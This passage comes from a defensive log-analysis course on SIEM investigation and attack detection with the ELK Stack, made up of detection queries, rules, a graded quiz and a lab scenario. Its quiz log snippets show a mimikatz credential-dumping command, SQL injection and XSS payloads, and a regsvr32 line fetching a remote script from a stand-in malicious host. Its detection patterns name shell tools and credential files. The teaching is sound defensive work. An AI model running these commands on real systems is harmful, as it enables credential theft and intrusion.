+Step 1: Identify the Accessor
+url.path: "/admin/dashboard" AND http.response.status_code: 403
+Step 2: Check Source IP History
+source.ip: "10.0.0.5"
+Step 3: Look for Other Forbidden Resources
+source.ip: "10.0.0.5" AND http.response.status_code: (401 OR 403)
+Step 4: Check Authentication Attempts
+source.ip: "10.0.0.5" AND event.category: authentication
+Step 5: Review Firewall Actions
+source.ip: "10.0.0.5" AND event.action: (blocked OR denied)
+Building Investigation Dashboards
+Essential Panels for Incident Investigation
+1. Timeline Panel
+* Visualization: Line chart or area chart
+* X-axis: @timestamp
+* Y-axis: Event count
+* Split: event.category or event.action
+2. Top Talkers
+* Visualization: Data table or bar chart
+* Metric: Top 10 source IPs by event count
+* Filter: Current investigation scope
+3. Event Category Breakdown
+* Visualization: Pie chart or donut
+* Field: event.category
+* Shows distribution of event types
+4. Geographic Map
+* Visualization: Coordinate map
+* Field: source.geo.location
+* Shows attack origins
+5. Failed Authentication Timeline
+* Visualization: Heat map
+* X-axis: Hour of day
+* Y-axis: Day of week
+* Metric: Failed login count
+6. Top Targeted Users
+* Visualization: Horizontal bar
+* Field: user.name
+* Filter: event.outcome: failure
+Elastic Security SIEM Features
+Detection Rules
+Create custom detection rules in Elastic Security:
+{  "name": "SSH Brute Force Attack",  "description": "Detects multiple failed SSH logins from same IP",  "risk_score": 75,  "severity": "high",  "type": "threshold",  "query": "event.category: authentication AND event.outcome: failure AND destination.port: 22",  "threshold": {    "field": ["source.ip"],    "value": 5  },  "schedule": {    "interval": "5m"  }}
+Timeline Investigation
+Elastic Security Timeline allows:
+* Drag-and-drop events into investigation
+* Add notes and comments
+* Link related events
+* Export investigation details
+Case Management
+Create cases for incidents:
+* Attach timelines
+* Track investigation status
+* Assign to analysts
+* Document findings
+Lab Exercise: Full Investigation
+Scenario
+At 10:15, the SIEM alerted on multiple failed authentication attempts. Investigate the incident and document your findings.
+Data Sources
+Use the sample logs:
+* access.log - Web server access logs
+* auth.log - Authentication logs
+* firewall.log - Firewall logs
+* app_error.log - Application errors
+Tasks
+Identify the Attack Source
+* Find the IP responsible for failed logins
+* Query: event.outcome: failure
+Build a Timeline
+* Document all events from the attacker IP
+* Query: source.ip: "10.0.0.6"
+Identify Attack Scope
+* What services were targeted?
+* What accounts were targeted?
+Check for Success
+* Did the attacker succeed?
+* Query: source.ip: "10.0.0.6" AND event.outcome: success
+Document IOCs
+* Extract all indicators
+* IP addresses, usernames, ports, URLs
+Write Investigation Report
+* Use the template below
+Investigation Report Template
+# Security Incident Report## Executive SummaryBrief description of the incident and outcome.## Incident Details- **Detection Time:**- **Investigation Start:**- **Investigation End:**- **Analyst:**## Attack Timeline| Timestamp | Source | Destination | Action | Details ||-----------|--------|-------------|--------|---------|| | | | | |## Indicators of Compromise### IP Addresses-### Domains/URLs-### File Hashes-### User Accounts-## Attack Analysis### Attack VectorHow did the attack occur?### Techniques UsedMITRE ATT&CK mapping:-### Impact AssessmentWhat was affected?## Containment ActionsWhat was done to stop the attack?## Recommendations1.2.3.## Appendix### Raw Logs### Query History
+Key Takeaways
+* Systematic investigation using the workflow ensures thorough analysis
+* Pivoting expands investigation scope by connecting related evidence
+* Timeline analysis reveals the sequence and impact of events
+* Event correlation across data sources provides complete visibility
+* Documentation is critical for incident response and lessons learned
+Review Questions
+* What are the main phases of incident investigation?
+* How do you pivot from an IP address to find related activity?
+* Why is timeline analysis important in incident investigation?
+* What are the key elements of an IOC?
+* How does event correlation improve investigation effectiveness?
+Next Lesson
+In Lesson 04, you will learn how to filter and detect attacks across different environments, including cloud, on-premise, and hybrid infrastructures.
+Foundations of Log Analysis for Cyber Defense - 5.4 Filtering and Detecting Attacks Across Environments
+Lesson 04: Filtering and Detecting Attacks Across Environments
+Overview
+Security teams must detect attacks across diverse environments including cloud platforms, on-premise infrastructure, containers, and hybrid deployments. This lesson covers detection strategies, filtering techniques, and attack patterns specific to different environments.
+Detection Engineering Fundamentals
+The Detection Pyramid
+▲                   /│\                  / │ \                 /  │  \    SPECIFIC                /   │   \   Detection Rules               / TTP│s   \  (Difficult to evade)              /─────┼─────\             /  Techniques \            /───────┼───────\           /   Procedures    \          /─────────┼─────────\         /     Behaviors       \        /───────────┼───────────\       /        Anomalies        \      /─────────────┼─────────────\     /      Indicators (IOCs)      \    GENERIC    /───────────────┴───────────────\   (Easy to evade)   ─────────────────────────────────────
+Detection Categories
+Category | Description | Example
+Signature-Based | Known patterns/IOCs | Hash matches, IP blocklists
+Behavioral | Suspicious activity patterns | Unusual login times
+Anomaly-Based | Deviation from baseline | Traffic volume spikes
+Threshold-Based | Count exceeds limit | >10 failed logins/minute
+Correlation-Based | Multiple events connected | Login + sensitive file access
+Environment-Specific Detection
+On-Premise Infrastructure
+Windows Event Log Detection
+Key Event IDs for Security:
+Event ID | Description | Detection Use
+4624 | Successful logon | Track access
+4625 | Failed logon | Brute force detection
+4648 | Explicit credential use | Pass-the-hash
+4672 | Special privileges assigned | Privilege escalation
+4688 | New process created | Malware execution
+4698 | Scheduled task created | Persistence
+4720 | User account created | Backdoor accounts
+4732 | Member added to local group | Privilege escalation
+7045 | Service installed | Persistence/Malware
+Detection Queries:
+# Failed logins (brute force)winlog.event_id: 4625 AND source.ip: *# Successful login after failureswinlog.event_id: 4624 AND user.name: "<target_user>"# Privilege escalationwinlog.event_id: 4672# New service installedwinlog.event_id: 7045# Process creation with suspicious parentwinlog.event_id: 4688 AND process.parent.name: (cmd.exe OR powershell.exe)
+Sysmon Detection (Enhanced Logging):
+Event ID | Description | Detection Use
+1 | Process creation | Malware, lateral movement
+3 | Network connection | C2 communication
+7 | Image loaded | DLL injection
+8 | CreateRemoteThread | Process injection
+10 | Process access | Credential dumping
+11 | File created | Dropped files
+13 | Registry value set | Persistence
+22 | DNS query | C2 domains
+# Suspicious PowerShell executionevent.provider: "Microsoft-Windows-Sysmon" AND event.code: 1 ANDprocess.name: "powershell.exe" ANDprocess.command_line: (*-enc* OR *-encoded* OR *downloadstring* OR *iex*)# LSASS access (credential dumping)event.code: 10 AND winlog.event_data.TargetImage: *lsass.exe*# Suspicious network connectionevent.code: 3 AND destination.port: (4444 OR 5555 OR 6666 OR 1337 OR 8080)
+Linux Detection
+Key Log Sources:
+Log | Location | Content
+auth.log | /var/log/auth.log | Authentication events
+syslog | /var/log/syslog | System events
+secure | /var/log/secure | Security events (RHEL)
+auditd | /var/log/audit/audit.log | Detailed system calls
+Detection Queries:
+# SSH brute forceservice.name: sshd AND event.action: ("Failed password" OR "authentication failure")# Successful root loginuser.name: root AND event.outcome: success# Sudo privilege escalationprocess.name: sudo AND event.outcome: success# Suspicious commandsprocess.command_line: (*wget* OR *curl* OR *nc* OR *ncat* OR *chmod 777*)# Crontab modification (persistence)file.path: "/etc/crontab" OR file.path: *cron.d*# SSH key addition (persistence)file.path: *authorized_keys* AND event.action: created
+Cloud Environment Detection
+AWS CloudTrail
+High-Value Events:
+Event Name | Description | Threat
+ConsoleLogin | AWS console access | Unauthorized access
+CreateUser | New IAM user | Backdoor account
+AttachUserPolicy | Policy attached | Privilege escalation
+CreateAccessKey | New access key | Persistence
+StopLogging | CloudTrail disabled | Defense evasion
+AuthorizeSecurityGroupIngress | SG rule added | Network exposure
+PutBucketPolicy | S3 policy changed | Data exposure
+CreateKeyPair | New EC2 key pair | Persistence
+Detection Queries:
+# Console login from unusual locationcloud.provider: aws AND event.action: ConsoleLogin ANDNOT source.geo.country_iso_code: (US OR CA)# Root account usagecloud.provider: aws AND aws.cloudtrail.user_identity.type: Root# IAM user createdcloud.provider: aws AND event.action: CreateUser# Access key createdcloud.provider: aws AND event.action: CreateAccessKey# CloudTrail stoppedcloud.provider: aws AND event.action: (StopLogging OR DeleteTrail)# S3 bucket made publiccloud.provider: aws AND event.action: PutBucketAcl ANDaws.cloudtrail.request_parameters: *public*# Security group openedcloud.provider: aws AND event.action: AuthorizeSecurityGroupIngress ANDaws.cloudtrail.request_parameters: *0.0.0.0/0*# Failed API calls (reconnaissance)cloud.provider: aws AND event.outcome: failure
+Azure Activity Logs
+High-Value Events:
+Operation | Description | Threat
+Sign-in activity | User login | Unauthorized access
+Add member to role | Role assignment | Privilege escalation
+Create or update secret | Key Vault secret | Credential access
+Create user | New user created | Backdoor
+Regenerate storage keys | Key regeneration | Credential access
+Detection Queries:
+# Failed Azure AD sign-inscloud.provider: azure AND event.category: authentication ANDevent.outcome: failure# Successful login from new locationcloud.provider: azure AND event.action: "Sign-in activity" ANDevent.outcome: success AND azure.signinlogs.properties.isInteractive: true# Role assignmentcloud.provider: azure AND event.action: "Add member to role" ANDazure.activitylogs.properties.targetResources.role: (Owner OR Contributor)# Key Vault accesscloud.provider: azure AND azure.resource.type: "Microsoft.KeyVault/vaults"# Conditional Access policy modifiedcloud.provider: azure AND event.action: "Update conditional access policy"
+Google Cloud Platform (GCP)
+Detection Queries:
+# Console logincloud.provider: gcp AND event.action: "google.cloud.audit.AuditLog"# IAM policy changecloud.provider: gcp AND event.action: "SetIamPolicy"# Service account key createdcloud.provider: gcp AND event.action: "google.iam.admin.v1.CreateServiceAccountKey"# Firewall rule createdcloud.provider: gcp AND event.action: "v1.compute.firewalls.insert"# Compute instance createdcloud.provider: gcp AND event.action: "v1.compute.instances.insert"
+Container and Kubernetes Detection
+Docker Detection
+Key Events:
+Event | Description | Threat
+Container created | New container | Unauthorized deployment
+Privileged container | Privileged mode | Escape risk
+Host mount | Volume mount | Data access
+Exec into container | Interactive shell | Post-exploitation
+Detection Queries:
+# Privileged container startedcontainer.runtime: docker AND container.security_context.privileged: true# Container with host mountcontainer.runtime: docker AND container.image.name: * ANDmessage: *host*# Exec into containerevent.action: "exec_start" AND container.id: *# Container running as rootcontainer.user.name: root# Suspicious imagecontainer.image.name: (*alpine* AND NOT container.image.name: *official*)
+Kubernetes Audit Logs
+High-Value Events:
+Resource | Verb | Threat
+secrets | get/list | Credential access
+pods | create | Malicious deployment
+pods/exec | create | Container access
+clusterroles | create | Privilege escalation
+serviceaccounts | create | Persistence
+Detection Queries:
+# Secret accesskubernetes.audit.objectRef.resource: "secrets" ANDkubernetes.audit.verb: (get OR list)# Pod exec (interactive shell)kubernetes.audit.objectRef.resource: "pods" ANDkubernetes.audit.objectRef.subresource: "exec"# Privileged pod creationkubernetes.audit.verb: "create" ANDkubernetes.audit.objectRef.resource: "pods" ANDkubernetes.audit.requestObject.spec.containers.securityContext.privileged: true# Service account creationkubernetes.audit.verb: "create" ANDkubernetes.audit.objectRef.resource: "serviceaccounts"# Cluster role bindingkubernetes.audit.verb: (create OR update) ANDkubernetes.audit.objectRef.resource: "clusterrolebindings"# Failed authorizationkubernetes.audit.annotations.authorization.k8s.io/decision: "forbid"
+Attack Pattern Detection
+MITRE ATT&CK Mapping
+Initial Access (TA0001)
+Phishing Detection:
+# Email with suspicious attachmentemail.attachments.file.extension: (exe OR dll OR js OR vbs OR hta OR scr) ANDemail.direction: inbound# Email with suspicious linkemail.body: (*drive.google.com* OR *dropbox.com* OR *bit.ly*) ANDemail.direction: inbound
+Brute Force Detection:
+# Multiple failed loginsevent.category: authentication AND event.outcome: failure# Aggregation query for threshold{  "aggs": {    "by_source": {      "terms": { "field": "source.ip", "size": 10 },      "aggs": {        "failed_count": {          "filter": { "term": { "event.outcome": "failure" } }        }      }    }  }}
+Execution (TA0002)
+Suspicious Script Execution:
+# PowerShell with encoded commandprocess.name: "powershell.exe" ANDprocess.command_line: (*-enc* OR *-EncodedCommand* OR *FromBase64String*)# WMIC remote executionprocess.name: "wmic.exe" ANDprocess.command_line: */node:*# Mshta executionprocess.name: "mshta.exe" AND process.command_line: *http*
+Persistence (TA0003)
+Registry Persistence:
+registry.path: (*\\Run\\* OR *\\RunOnce\\* OR *\\Services\\*) ANDevent.action: (created OR modified)
+Scheduled Task:
+winlog.event_id: 4698 OR(process.name: "schtasks.exe" AND process.command_line: */create*)
+SSH Key Addition:
+file.path: *authorized_keys* AND event.action: (created OR modified)
+Privilege Escalation (TA0004)
+Admin Group Addition:
+winlog.event_id: 4732 ANDwinlog.event_data.TargetUserName: Administrators# Linux sudo abuseprocess.name: sudo AND event.outcome: success ANDNOT user.name: (admin OR root)
+Defense Evasion (TA0005)
+Log Clearing:
+winlog.event_id: 1102 OR(process.name: "wevtutil.exe" AND process.command_line: *cl*)# Linuxprocess.command_line: (*rm* AND *log*) ORprocess.command_line: *history -c*
+Timestomping:
+process.name: "touch" AND process.command_line: *-t*
+Credential Access (TA0006)
+LSASS Memory Access:
+event.code: 10 ANDwinlog.event_data.TargetImage: *lsass.exe* ANDNOT process.name: (antimalware* OR mrt.exe)
+Credential Dumping Tools:
+process.name: (mimikatz* OR procdump* OR sekurlsa*)
+Lateral Movement (TA0008)
+Remote Service Execution:
+# PsExecprocess.name: "psexec*" ORwinlog.event_id: 5145 AND winlog.event_data.ShareName: *ADMIN$*# WMIprocess.name: "wmiprvse.exe" ANDprocess.parent.name: "svchost.exe"# WinRMprocess.name: "wsmprovhost.exe"
+RDP:
+winlog.event_id: 4624 AND winlog.event_data.LogonType: 10
+Exfiltration (TA0010)
+Large Data Transfer:
+network.bytes > 50000000 AND network.direction: outbound# DNS exfiltration indicatordns.question.name.length > 50
+Upload to Cloud Storage:
+url.domain: (*dropbox.com* OR *drive.google.com* OR *onedrive.live.com*) ANDhttp.request.method: (POST OR PUT)
+Advanced Filtering Techniques
+Reducing False Positives
+Baseline-Based Filtering:
+# Exclude known admin IPssource.ip: "10.0.0.6" AND NOT source.ip: (192.168.1.1 OR 192.168.1.2)# Exclude service accountsevent.action: login AND NOT user.name: (svc_* OR SYSTEM OR *$)# Exclude known processesNOT process.name: (svchost.exe OR services.exe OR csrss.exe)
+Time-Based Filtering:
+# Business hours only@timestamp >= "2024-01-15T08:00:00" AND @timestamp <= "2024-01-15T18:00:00"# Weekdays only (requires day_of_week field)event.day_of_week: (Monday OR Tuesday OR Wednesday OR Thursday OR Friday)
+Threshold-Based Filtering:
+{  "query": {    "bool": {      "filter": [        { "term": { "event.outcome": "failure" } }      ]    }  },  "aggs": {    "high_volume_sources": {      "terms": {        "field": "source.ip",        "min_doc_count": 10      }    }  }}
+Creating Detection Rules
+Elastic Security Rule Format:
+{  "name": "Brute Force SSH - Multiple Failed Logins",  "description": "Detects potential brute force attack on SSH",  "risk_score": 73,  "severity": "high",  "type": "threshold",  "index": ["filebeat-*", "logs-*"],  "query": "event.category: authentication AND event.outcome: failure AND destination.port: 22",  "threshold": {    "field": ["source.ip"],    "value": 10  },  "from": "now-5m",  "to": "now",  "interval": "5m",  "tags": ["attack.credential_access", "attack.t1110"],  "threat": [    {      "framework": "MITRE ATT&CK",      "tactic": {        "id": "TA0006",        "name": "Credential Access"      },      "technique": [        {          "id": "T1110",          "name": "Brute Force"        }      ]    }  ]}
+EQL (Event Query Language) for Sequences:
+sequence by source.ip with maxspan=5m  [authentication where event.outcome == "failure"] with runs=5  [authentication where event.outcome == "success"]
+Multi-Environment Correlation
+Cross-Environment Detection
+Cloud + On-Premise Correlation:
+┌────────────────────────────────────────────────────────────────────┐│                  CROSS-ENVIRONMENT ATTACK PATTERN                  │└────────────────────────────────────────────────────────────────────┘    On-Premise                      Cloud (AWS)    ──────────                      ───────────    Step 1: Initial Access          Step 4: Lateral Movement    Phishing email received         Access Key used from    User opens attachment           unusual location         │                               ▲         ▼                               │    Step 2: Execution                    │    Malware runs, establishes       Step 3: Credential Theft    C2 connection                   AWS credentials stolen         │                          from compromised host         └───────────────────────────────┘
+Detection Query:
+# Step 1-2: On-premise compromise(process.name: powershell.exe AND process.command_line: *download*) OR(network.direction: outbound AND destination.port: (443 OR 80) AND NOT destination.domain: (*.microsoft.com OR *.windows.com))# Step 3-4: Cloud lateral movementcloud.provider: aws AND event.action: (GetObject OR ListBuckets) ANDsource.geo.country_iso_code: NOT US ANDaws.cloudtrail.user_identity.type: IAMUser
+Unified Timeline View
+Create a Kibana dashboard combining:
+* On-Premise Events: Windows, Linux, network devices
+* Cloud Events: AWS CloudTrail, Azure Activity, GCP Audit
+* Container Events: Kubernetes audit, Docker events
+* Identity Events: Active Directory, SSO, IAM
+Dashboard Filters:
+# All authentication events across environmentsevent.category: authentication# All events from specific useruser.name: "compromised_user"# All events in time window@timestamp >= "2024-01-15T10:00:00" AND @timestamp <= "2024-01-15T12:00:00"
+Lab Exercise: Multi-Environment Attack Detection
+Scenario
+An attacker has compromised an on-premise workstation and is attempting to move laterally to cloud resources.
+Attack Chain
+* Phishing - User clicks malicious link
+* Execution - Malware establishes C2
+* Credential Access - AWS credentials stolen
+* Cloud Access - Attacker accesses S3 buckets
+Detection Tasks
+Task 1: Detect Initial Compromise
+# Find suspicious process executionprocess.parent.name: (outlook.exe OR chrome.exe OR firefox.exe) ANDprocess.name: (powershell.exe OR cmd.exe OR wscript.exe)
+Task 2: Detect C2 Communication
+# Find outbound connections to suspicious destinationsnetwork.direction: outbound ANDNOT destination.domain: (*.microsoft.com OR *.google.com OR *.amazonaws.com) ANDdestination.port: (443 OR 80 OR 8080)
+Task 3: Detect Credential Access
+# Find access to AWS credential filesfile.path: (*.aws/credentials* OR *.aws/config*)
+Task 4: Detect Cloud Lateral Movement
+# Find AWS API calls from unusual locationscloud.provider: aws ANDsource.geo.country_iso_code: NOT US ANDevent.outcome: success
+Building the Complete Rule Set
+Create four detection rules that trigger in sequence to identify this attack chain.
+Detection Rule Library
+Authentication Attacks
+Rule Name | Query | Threshold
+SSH Brute Force | destination.port: 22 AND event.outcome: failure | 10/5min
+RDP Brute Force | destination.port: 3389 AND event.outcome: failure | 10/5min
+Failed Login Spike | event.outcome: failure | 50/hour
+Login After Hours | event.outcome: success AND hour_of_day: [0 TO 6] | Any
+Network Attacks
+Rule Name | Query | Threshold
+Port Scan | event.action: denied AND destination.port: [1 TO 1024] | 20/min
+C2 Ports | destination.port: (4444 OR 5555 OR 1337) | Any
+DNS Tunneling | dns.question.name.length > 50 | 5/min
+Large Upload | network.bytes > 100000000 AND direction: outbound | Any
+Endpoint Attacks
+Rule Name | Query | Threshold
+Encoded PowerShell | process.command_line: *-enc* | Any
+LSASS Access | winlog.event_data.TargetImage: *lsass.exe* | Any
+Service Install | winlog.event_id: 7045 | 3/hour
+Scheduled Task | winlog.event_id: 4698 | 3/hour
+Cloud Attacks
+Rule Name | Query | Threshold
+Root Login | aws.cloudtrail.user_identity.type: Root | Any
+Key Creation | event.action: CreateAccessKey | Any
+S3 Public | event.action: PutBucketAcl AND *public* | Any
+CloudTrail Stop | event.action: StopLogging | Any
+Key Takeaways
+* Different environments require different detection strategies - Windows, Linux, Cloud, and Containers each have unique log sources and attack patterns
+* MITRE ATT&CK provides a framework for organizing detections by technique
+* Threshold and sequence-based rules catch patterns that single-event rules miss
+* False positive tuning is essential for effective detection
+* Cross-environment correlation reveals attack chains that span infrastructure
+Review Questions
+* What Windows Event ID indicates a successful logon?
+* How would you detect an attacker disabling CloudTrail logging?
+* What is the difference between signature-based and behavioral detection?
+* How do you reduce false positives in brute force detection?
+* Write a query to detect suspicious PowerShell execution.
+Module Summary
+Congratulations on completing the SIEM with ELK Stack module! You have learned:
+* Lesson 01: SIEM fundamentals and ELK Stack architecture
+* Lesson 02: Query languages (KQL, Lucene, Query DSL)
+* Lesson 03: Incident investigation methodology
+* Lesson 04: Attack detection across environments
+Next Steps
+* Build a home lab with ELK Stack
+* Ingest sample log data
+* Create custom detection rules
+* Practice incident investigation scenarios
+* Explore Elastic Security features
+Additional Resources
+* Elastic Security Documentation
+* MITRE ATT&CK Framework
+* Sigma Rules Repository
+* Elastic Detection Rules Repository
+Foundations of Log Analysis for Cyber Defense - About Assessment and Quizzes
+Overview
+In this final module, learners will apply everything learned across the course by solving log analysis challenges and packet capture investigations. Each exercise is hands-on and designed to simulate real-world security incidents. Learners will need to analyze logs, detect threats, and choose the correct diagnosis or course of action.
+Quiz Format
+* Each question is based on:
+* A log snippet (Sysmon, firewall, proxy, SIEM, etc.)
+* Or a PCAP extract from https://www.malware-traffic-analysis.net/
+* The student must:
+* Analyze and interpret what is happening
+* Choose the correct answer among 4 options
+* Optionally explain their reasoning
+Foundations of Log Analysis for Cyber Defense - Final Assessment
+Quiz Results
+You passed the quiz!
+You scored 92%. A passing grade is 80%.
+Retake
+See all pages
+Page 1 of 12
+Log Snippet (Sysmon Event ID 10):
+Image: C:\Windows\System32\mimikatz.exeCommandLine: mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"ParentImage: C:\Windows\System32\cmd.exe
+What is this activity indicative of?
+A) Disabling antivirus services
+B) Injecting code into LSASS
+C) Extracting credentials from memory
+D) Modifying registry autoruns
+Log Snippet (Web Server):
+GET /login.php?user=admin'--&pass=123Status: 200 OK
+What is the most likely type of attack?
+A) SQL Injection
+B) Reflected XSS
+C) Broken Authentication
+D) SSRF
+Log Snippet:
+Event ID: 4625 (Failed Logon)Logon Type: 10 (RemoteInteractive)Target User: administratorSource IP: 203.0.113.88Attempts in last hour: 431
+What is the attacker most likely doing?
+A) Port scanning
+B) Credential brute forcing
+C) Pivoting via SMB
+D) Exploiting remote service
+Log Snippet (Sysmon + Windows Event Logs):
+4624 - Logon Type: 3 (Network)New Logon: user=svc_adminLogon Process: NtLmSspWorkstation: WS-FINANCESource: 10.10.10.25
+What does this indicate?
+A) User logon via RDP session
+B) Interactive login from local user
+C) Remote login via SMB from another host
+D) Kerberos ticket forgery
+Log Snippet (Sysmon Event ID 1):
+CommandLine: powershell.exe -enc UwB...Image: powershell.exeParent: winword.exe
+What is the purpose of the -enc flag?
+A) Execute encoded payload to evade detection
+B) Encrypt local files
+C) Dump environment variables
+D) Schedule persistence task
+Zscaler Web Log Snippet:
+URL: https://example.com/search?q=<script>alert('X')</script>User-Agent: Firefox
+Which vulnerability is being tested?
+A) Command Injection
+B) XSS (Reflected)
+C) SQL Injection
+D) Open Redirect
+Firewall Log Snippet:
+Outbound HTTPS to dl.dropboxusercontent.comTransferred: 1.2 GB over 3 minutesUser-Agent: curl/7.68.0
+What is the most likely scenario?
+A) Backup job using cloud storage
+B) DNS tunneling
+C) Routine Dropbox sync
+D) Malicious script exfiltrating data
+Log Snippet (Firewall/NGFW):
+Connections from IP: 198.51.100.34Port: 443Requests/sec: 3000Total unique IPs: 650+
+Which event is most likely?
+A) C2 beaconing
+B) Slowloris attack
+C) TLS inspection bypass
+D) DDoS via botnet
+DNS Log Snippet:
+Host: WS-MARKETINGQueried Domain: xyz1234ddfsf.burpcollaborator.net
+This DNS pattern most likely indicates:
+A) Benign misconfiguration
+B) Phishing via email links
+C) Exploit callback via OOB interaction
+D) C2 communication via DNS tunneling
+Sysmon Event ID 1:
+Image: schtasks.exeCommand: schtasks /create /tn "Update" /tr "powershell -enc ..." /sc minute /mo 5
+What is this activity?
+A) Log cleaning
+B) Scheduled task creation for persistence
+C) MSI installation
+D) Service restart
+EDR Alert:
+Process: rundll32.exeNetwork Connection: 5.188.86.119:443Beacon Interval: Every 60 secondsJitter: 10%
+This is most likely an indicator of:
+A) Malware beaconing to C2
+B) Vulnerability scanning
+C) Normal update process
+D) DNS failover
+Log Snippet:
+Image: regsvr32.exeCommand: regsvr32 /s /n /u /i:http://malicious.site/file.sct scrobj.dll
+What technique is being abused here?
+A) Registry key tampering
+B) Lateral movement via WMI
+C) LOLBAS execution for remote script
+D) EDR evasion via custom PE loader
+Lab Scenario Analysis
+This document outlines the correlated events across the generated log files (access.log, auth.log, app_error.log, and firewall.log). These correlations can be used to build a comprehensive story of user and system activities for your log analysis course.
+Scenario 1: Successful User Login and Activity
+* User: admin
+* IP Address: 192.168.1.4
+* Firewall Log (firewall.log):
+* Dec 30 10:01:10: The firewall allows TCP traffic on port 443 (HTTPS) from 192.168.1.4. This could be the user accessing the web application's login page.
+* Access Log (access.log):
+* 30/Dec/2025:10:01:15: A POST request is made to /login from 192.168.1.4. This is the user submitting their login credentials. The request is successful (HTTP 200).
+* Authentication Log (auth.log):
+* Dec 30 10:01:15: A successful sshd password acceptance for user admin from 192.168.1.4 is logged. This confirms the successful login attempt seen in the access log.
+* Access Log (access.log):
+* 30/Dec/2025:10:06:00: The same IP 192.168.1.4 performs a POST to /cart/add, indicating the logged-in user is now interacting with the application.
+* 30/Dec/2025:10:13:00: The same IP performs a POST to /logout.
+Scenario 2: Internal Server Error
+* User IP: 192.168.1.1
+* Event Time: Around 10:07:30
+* Access Log (access.log):
+* 30/Dec/2025:10:07:30: A GET request to /api/v1/user/123 from 192.168.1.1 results in an HTTP 500 "Internal Server Error". This tells us something went wrong on the server side.
+* Application Error Log (app_error.log):
+* 2025-12-30 10:07:30,111: The application logs a WARN that the endpoint /api/v1/user/123 is deprecated.
+* 2025-12-30 10:07:30,112: Immediately after, an ERROR is logged with a full Java NullPointerException stack trace. The error message "Critical error processing request for user 123. User data not found" directly correlates with the API call from the access log. This gives the root cause of the HTTP 500 error.
+Scenario 3: Blocked Malicious Activity / Brute-Force attempt
+* Attacker IP: 10.0.0.6
+* Target: admin user account, various admin pages.
+* Access Log (access.log):
+* 30/Dec/2025:10:08:00 - 10:08:02: IP 10.0.0.6 scans for common web administration pages (/wp-login.php, /administrator/index.php, etc.) and receives HTTP 404 "Not Found" errors. This is a classic reconnaissance pattern.
+* Authentication Log (auth.log):
+* Dec 30 10:15:10 - 10:15:27: The same IP 10.0.0.6 makes multiple Failed password attempts for the admin user via sshd. This is a clear brute-force attack.
+* Dec 30 10:15:27: The system disconnects the user.
+* Firewall Log (firewall.log):
+* Dec 30 10:15:20: The firewall logs a REJECT action for traffic from 10.0.0.6 on port 22 (SSH), likely as a result of a security policy (like fail2ban) automatically blocking the IP after repeated failed logins.
+* The firewall also blocks diğer login attempts from the same IP at 10:08:00 on port 23 (telnet) and at 10:41:00 on port 22 (SSH).
+Scenario 4: Unauthorized Access Attempt
+* Attacker IP: 10.0.0.5
+* Target: /admin/dashboard
+* Firewall Log (firewall.log):
+* Dec 30 10:03:30: The firewall BLOCKs traffic from 10.0.0.5 attempting to connect to port 22 (SSH).
+* Access Log (access.log):
+* 30/Dec/2025:10:03:30: IP 10.0.0.5 attempts to GET /admin/dashboard and receives an HTTP 403 "Forbidden" error. This indicates the web server is configured to deny access to this resource from that IP.
+* Authentication Log (auth.log):
+* Dec 30 10:05:30: The same IP 10.0.0.5 tries to log in via SSH as visitor and fails.
+These scenarios provide a clear path for students to follow, starting from one log file and pivoting to others to get a complete picture of the events.
